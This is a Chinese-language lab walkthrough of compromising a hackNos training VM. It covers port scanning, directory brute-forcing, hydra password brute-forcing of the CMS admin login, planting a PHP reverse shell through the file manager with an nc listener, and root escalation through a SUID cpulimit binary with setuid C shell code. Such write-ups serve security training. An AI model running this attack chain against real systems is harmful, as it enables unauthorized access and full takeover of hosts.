VirtualBox双击打开，默认wifi桥接模式！用探测发现IP地址！alivecheck 1.6-快速扫描.jar
172.20.10.8

--------------------------------------------
--------------------------------------------
1、nmap 172.20.10.8 -p- -A

22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))




--------------------------------------------
--------------------------------------------
2、web信息收集

访问：
http://172.20.10.8/websec/

AWVS发现没有任何漏洞！

--------------------------------------------
--------------------------------------------
3、目录爆破+管理后台

登录发现账号是需要邮箱，在主页发现邮箱信息：
contact@hacknos.com

dirb http://172.20.10.8/websec/
http://172.20.10.8/websec/admin

访问报错：Wrong email or password


--------------------------------------------
--------------------------------------------
4、管理后台爆破

cewl http://172.20.10.8/websec > dayu.txt
利用cewl单词列表生成器创建一个简短的单词列表，然后进行爆破。


hydra -L user.txt -P dayu.txt 172.20.10.8 http-post-form "/websec/admin:username=^USER^&password=^PASS^:Wrong email or password"

[80][http-post-form] host: 172.20.10.8   login: contact@hacknos.com   password: Securityx
成功登录！

--------------------------------------------
--------------------------------------------
5、webshell

登录后台选择：Content -> File Manager -> index.php
写入php-reverse-shell.php!

nc -vlp 1234
然后访问：
http://172.20.10.8/websec/index.php

python -c 'import pty; pty.spawn("/bin/bash")'

--------------------------------------------
--------------------------------------------
6、内网信息收集

uid=1000(blackdevil) gid=118(docker) groups=118(docker),4(adm),24(cdrom),27(sudo)

+] SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root   root             31K Jul  6  2019 /usr/bin/cpulimit


--------------------------------------------
--------------------------------------------
7、提权

方法1：
/usr/bin/cpulimit
cpulimit是一个开源的cpu使用限制工具，可以针对某个进程名、pid等来限制cpu使用率官方网址:http://cpulimit.sourceforge.net/ 安装方法非常简单编译后就可以使用cpulimit. 这个压缩包里面实现的代码是设置进程占用CPU的上限。

https://gtfobins.github.io/gtfobins/cpulimit/#suid

------
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main (void)
{
 setuid(0), setgid(0); system("/bin/bash");
}
------
gcc shell.c  -o shell

文件上传：
1）nc -lp 6666 > shell
2）kali执行：nc -w 3 172.20.10.8 6666 < shell
chmod u+x shell
cpulimit -l 100 -f ./shell

成功拿到root权限！


---注意这里是bash的shell！
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash"); }
---
nano写入shell.c文件
gcc shell.c -o shell
chmod 4777 shell
./shell
成功提权

--------------------------------------------
方法2：
www-data@hacknos:/var/local$ cat database 
Expenses
Software Licenses,$2.78
Maintenance,$68.87
Mortgage Interest,$70.35
Advertising,$9.78
Phone,$406.80
Insurance,$9.04
Opss;fackespreadsheet


谷歌搜索：
facke spreadsheet decode

https://www.spammimic.com/decode.shtml
选择：Decode fake spreadsheet
解码获得：Security@x@

su blackdevil
Security@x@

sudo -l
User blackdevil may run the following commands on hacknos:
    (ALL : ALL) ALL

sudo su  ---获得root权限！
--------------------------------------------

建议做好详细的笔记，Gail CMA在将来还是有可利用审计价值！




































































































































